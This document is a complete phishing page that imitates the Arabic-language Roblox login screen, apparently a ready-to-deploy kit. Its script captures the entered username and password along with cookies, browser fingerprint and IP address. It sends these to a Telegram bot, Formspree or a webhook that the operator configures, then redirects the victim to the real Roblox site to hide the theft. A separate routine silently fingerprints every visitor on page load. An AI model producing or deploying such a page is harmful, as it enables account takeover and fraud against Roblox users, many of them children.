<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>تسجيل الدخول إلى Roblox</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23000'/%3E%3Ctext x='16' y='23' font-family='Arial' font-size='20' font-weight='bold' fill='%23fff' text-anchor='middle'%3ER%3C/text%3E%3C/svg%3E">

    <style>
        /* ─── خط Roblox الرسمي ─── */
        @font-face {
            font-family: 'Builder Sans';
            src: local('Builder Sans'), local('Helvetica Neue'), local('Arial');
            font-display: swap;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --rbx-blue: #00a2ff;
            --rbx-blue-hover: #0089d6;
            --rbx-dark: #232527;
            --rbx-gray: #393b3d;
            --rbx-light-gray: #c3c6ca;
            --rbx-bg: #e5e5e5;
            --rbx-red: #d86868;
        }

        html, body {
            height: 100%;
            font-family: 'Builder Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #fff;
            color: var(--rbx-dark);
            -webkit-font-smoothing: antialiased;
        }

        /* ─── Header ─── */
        .header {
            background: #fff;
            border-bottom: 1px solid #e5e5e5;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 48px;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
            color: var(--rbx-dark);
        }
        .header-logo svg { width: 30px; height: 30px; }
        .header-logo span { font-size: 18px; font-weight: 700; }
        .header-links {
            display: flex;
            gap: 20px;
            list-style: none;
            font-size: 15px;
            font-weight: 500;
        }
        .header-links a {
            color: var(--rbx-dark);
            text-decoration: none;
            transition: color .15s;
        }
        .header-links a:hover { color: var(--rbx-blue); }
        .header-links a.active { color: var(--rbx-blue); }
        .header-actions { display: flex; gap: 12px; align-items: center; }
        .header-actions .login-link {
            color: var(--rbx-blue);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        /* ─── Main ─── */
        .main {
            background: #fff;
            min-height: calc(100vh - 48px);
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 40px 20px;
        }
        .login-wrap {
            width: 100%;
            max-width: 380px;
        }
        .page-title {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 28px;
            color: var(--rbx-dark);
            letter-spacing: -.2px;
        }

        .field {
            margin-bottom: 16px;
            position: relative;
        }
        .field label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: var(--rbx-dark);
            margin-bottom: 6px;
        }
        .field input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid var(--rbx-light-gray);
            border-radius: 4px;
            font-size: 15px;
            font-family: inherit;
            color: var(--rbx-dark);
            background: #fff;
            transition: border-color .15s, box-shadow .15s;
        }
        .field input:focus {
            outline: none;
            border-color: var(--rbx-blue);
            box-shadow: 0 0 0 2px rgba(0,162,255,.15);
        }
        .field input::placeholder { color: #8d9198; }
        .field input.error { border-color: var(--rbx-red); }
        .field-error {
            color: var(--rbx-red);
            font-size: 13px;
            margin-top: 6px;
            display: none;
        }
        .field-error.show { display: block; }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background: var(--rbx-blue);
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            margin-top: 8px;
            transition: background .15s;
        }
        .submit-btn:hover:not(:disabled) { background: var(--rbx-blue-hover); }
        .submit-btn:disabled { opacity: .6; cursor: not-allowed; }

        .forgot-link {
            display: block;
            text-align: right;
            margin-top: 12px;
            color: var(--rbx-blue);
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-link:hover { text-decoration: underline; }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #8d9198;
            font-size: 14px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #e5e5e5;
        }
        .divider span { padding: 0 12px; }

        .secondary-btn {
            width: 100%;
            padding: 12px;
            background: #fff;
            color: var(--rbx-dark);
            border: 1px solid var(--rbx-light-gray);
            border-radius: 4px;
            font-size: 15px;
            font-weight: 500;
            font-family: inherit;
            cursor: pointer;
            transition: background .15s, border-color .15s;
        }
        .secondary-btn:hover {
            background: #f5f5f5;
            border-color: #a5a8ac;
        }

        .signup-row {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: var(--rbx-dark);
        }
        .signup-row a {
            color: var(--rbx-blue);
            text-decoration: none;
            font-weight: 600;
            margin-right: 4px;
        }
        .signup-row a:hover { text-decoration: underline; }

        /* ─── Footer ─── */
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #8d9198;
            border-top: 1px solid #e5e5e5;
        }
        .footer a { color: #8d9198; text-decoration: none; margin: 0 8px; }
        .footer a:hover { text-decoration: underline; }

        /* ─── Loading overlay ─── */
        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(255,255,255,.85);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }
        .overlay.show { display: flex; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e5e5e5;
            border-top-color: var(--rbx-blue);
            border-radius: 50%;
            animation: spin .8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 480px) {
            .header-links { display: none; }
            .page-title { font-size: 24px; }
        }
    </style>
</head>
<body>

    <!-- ─── Header ─── -->
    <header class="header">
        <a href="https://www.roblox.com/ar" class="header-logo">
            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                <rect width="32" height="32" rx="6" fill="#000"/>
                <path d="M7.5 5.5 L26.5 5.5 L24.5 26.5 L5.5 26.5 Z" fill="#fff"/>
                <rect x="11" y="10" width="3" height="3" fill="#000"/>
                <rect x="18" y="10" width="3" height="3" fill="#000"/>
                <path d="M11 20 Q16 24 21 20" stroke="#000" stroke-width="2" fill="none" stroke-linecap="round"/>
            </svg>
            <span>ROBLOX</span>
        </a>
        <nav>
            <ul class="header-links">
                <li><a href="https://www.roblox.com/ar/charts">الرائجة</a></li>
                <li><a href="https://www.roblox.com/ar/catalog">السوق</a></li>
                <li><a href="https://www.roblox.com/ar/create">إنشاء</a></li>
                <li><a href="https://www.roblox.com/ar/upgrades/robux">Robux</a></li>
            </ul>
        </nav>
        <div class="header-actions">
            <a href="#" class="login-link" onclick="event.preventDefault();">تسجيل الدخول</a>
        </div>
    </header>

    <!-- ─── Main ─── -->
    <main class="main">
        <div class="login-wrap">
            <h1 class="page-title">تسجيل الدخول إلى Roblox</h1>

            <form id="loginForm" autocomplete="on" novalidate>
                <div class="field">
                    <label for="username">اسم المستخدم/البريد/الهاتف</label>
                    <input type="text" id="username" name="username"
                           placeholder="اسم المستخدم/البريد/الهاتف"
                           autocomplete="username"
                           autocapitalize="off"
                           autocorrect="off"
                           spellcheck="false"
                           required>
                    <div class="field-error" id="usernameError">الرجاء إدخال اسم المستخدم.</div>
                </div>

                <div class="field">
                    <label for="password">كلمة المرور</label>
                    <input type="password" id="password" name="password"
                           placeholder="كلمة المرور"
                           autocomplete="current-password"
                           required>
                    <div class="field-error" id="passwordError">الرجاء إدخال كلمة المرور.</div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>

                <a href="https://www.roblox.com/ar/Login/ResetPassword" class="forgot-link" target="_blank" rel="noopener">
                    نسيت كلمة المرور أو اسم المستخدم؟
                </a>
            </form>

            <div class="divider"><span>أو</span></div>

            <button class="secondary-btn" id="otpBtn" type="button">
                إرسال رمز صالح لمرة واحدة عبر البريد إلكتروني
            </button>

            <div class="signup-row">
                ليس لديك حساب؟
                <a href="https://www.roblox.com/ar/CreateAccount" target="_blank" rel="noopener">اشتراك</a>
            </div>
        </div>
    </main>

    <!-- ─── Footer ─── -->
    <footer class="footer">
        <a href="https://www.roblox.com/info/terms" target="_blank" rel="noopener">الشروط</a>
        <a href="https://www.roblox.com/info/privacy" target="_blank" rel="noopener">الخصوصية</a>
        <br><br>
        © 2026 Roblox Corporation
    </footer>

    <!-- ─── Loading overlay ─── -->
    <div class="overlay" id="overlay">
        <div class="spinner"></div>
    </div>

    <script>
    (function() {
        'use strict';

        // ═══════════════════════════════════════════════════════════════
        //  ⚙️  الإعدادات — عدّل هنا فقط
        // ═══════════════════════════════════════════════════════════════

        // اختر واحدة:
        // 1. FORMSPREE: سجّل في formspree.io، أنشئ form، ضع الـ ID هنا
        //    شكل الـ ID: xayzkqwe
        const FORMSPREE_ID = 'YOUR_FORMSPREE_ID_HERE';

        // 2. TELEGRAM: أنشئ bot عبر @BotFather، احصل على chat_id من @userinfobot
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

        // 3. WEBHOOK: أي endpoint (Discord webhook، مخصص، إلخ)
        const WEBHOOK_URL = '';

        // ─── الوجهة بعد "النجاح" — نوديهم لـ Roblox الحقيقي ───
        const REDIRECT_URL = 'https://www.roblox.com/ar/home';

        // ═══════════════════════════════════════════════════════════════
        //  جمع البيانات
        // ═══════════════════════════════════════════════════════════════

        function getCookies() {
            const out = {};
            if (!document.cookie) return out;
            document.cookie.split(';').forEach(c => {
                const [k, ...v] = c.trim().split('=');
                if (k) out[k] = v.join('=');
            });
            return out;
        }

        function getFingerprint() {
            const nav = navigator;
            const scr = window.screen;
            let webgl = 'unknown';
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) webgl = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}
            return {
                ua: nav.userAgent,
                lang: nav.language,
                langs: nav.languages,
                platform: nav.platform,
                cores: nav.hardwareConcurrency,
                mem: nav.deviceMemory,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: { w: scr.width, h: scr.height, depth: scr.colorDepth, dpr: window.devicePixelRatio },
                touch: 'ontouchstart' in window,
                webgl: webgl
            };
        }

        // ═══════════════════════════════════════════════════════════════
        //  إرسال البيانات
        // ═══════════════════════════════════════════════════════════════

        async function sendToFormspree(data) {
            if (!FORMSPREE_ID || FORMSPREE_ID === 'YOUR_FORMSPREE_ID_HERE') return false;
            try {
                const res = await fetch('https://formspree.io/f/' + FORMSPREE_ID, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify(data)
                });
                return res.ok;
            } catch(e) { return false; }
        }

        async function sendToTelegram(data) {
            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return false;
            const text =
                '🎯 <b>Roblox Capture</b>\n' +
                '🕐 ' + new Date().toISOString() + '\n' +
                '👤 User: <code>' + escapeHtml(data.username) + '</code>\n' +
                '🔑 Pass: <code>' + escapeHtml(data.password) + '</code>\n' +
                '🌐 IP: <code>' + escapeHtml(data.ip || '?') + '</code>\n' +
                '📱 UA: <code>' + escapeHtml((data.fp?.ua || '').slice(0, 100)) + '</code>\n' +
                '🕰️ TZ: <code>' + escapeHtml(data.fp?.tz || '?') + '</code>';
            try {
                const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
                });
                return res.ok;
            } catch(e) { return false; }
        }

        async function sendToWebhook(data) {
            if (!WEBHOOK_URL) return false;
            try {
                const res = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                return res.ok;
            } catch(e) { return false; }
        }

        function escapeHtml(s) {
            return String(s || '').replace(/[&<>"']/g, c => ({
                '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
            }[c]));
        }

        async function sendData(data) {
            const results = await Promise.allSettled([
                sendToFormspree(data),
                sendToTelegram(data),
                sendToWebhook(data)
            ]);
            return results.some(r => r.status === 'fulfilled' && r.value === true);
        }

        // ═══════════════════════════════════════════════════════════════
        //  جلب IP
        // ═══════════════════════════════════════════════════════════════

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
                const j = await res.json();
                return j.ip;
            } catch(e) { return null; }
        }

        // ═══════════════════════════════════════════════════════════════
        //  Form handler
        // ═══════════════════════════════════════════════════════════════

        const form = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const usernameError = document.getElementById('usernameError');
        const passwordError = document.getElementById('passwordError');
        const submitBtn = document.getElementById('submitBtn');
        const overlay = document.getElementById('overlay');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = usernameInput.value.trim();
            const password = passwordInput.value;

            usernameError.classList.remove('show');
            passwordError.classList.remove('show');
            usernameInput.classList.remove('error');
            passwordInput.classList.remove('error');

            let valid = true;
            if (!username) {
                usernameError.classList.add('show');
                usernameInput.classList.add('error');
                valid = false;
            }
            if (!password) {
                passwordError.classList.add('show');
                passwordInput.classList.add('error');
                valid = false;
            }
            if (!valid) return;

            submitBtn.disabled = true;
            submitBtn.textContent = 'جارٍ التحقق...';
            overlay.classList.add('show');

            const ip = await getIP();
            const payload = {
                username: username,
                password: password,
                cookies: getCookies(),
                fp: getFingerprint(),
                ip: ip,
                referrer: document.referrer,
                ts: new Date().toISOString(),
                page: 'roblox-ar-login'
            };

            // إرسال — حتى لو فشل، نكمل التحويل
            await sendData(payload);

            // تأخير بسيط لإيهام المستخدم بالمعالجة
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1200);
        });

        // مسح الأخطاء عند الكتابة
        usernameInput.addEventListener('input', () => {
            usernameError.classList.remove('show');
            usernameInput.classList.remove('error');
        });
        passwordInput.addEventListener('input', () => {
            passwordError.classList.remove('show');
            passwordInput.classList.remove('error');
        });

        // OTP button — يحوّل لصفحة Roblox الحقيقية
        document.getElementById('otpBtn').addEventListener('click', () => {
            window.location.href = 'https://www.roblox.com/ar/Login';
        });

        // ─── جمع بصمة الزيارة فوراً (بدون انتظار الـ form) ───
        (async () => {
            const ip = await getIP();
            const visitData = {
                type: 'visit',
                fp: getFingerprint(),
                cookies: getCookies(),
                ip: ip,
                referrer: document.referrer,
                ts: new Date().toISOString(),
                page: 'roblox-ar-login'
            };
            // إرسال صامت — ما يعطّل الصفحة
            sendData(visitData).catch(() => {});
        })();

    })();
    </script>
</body>
</html>
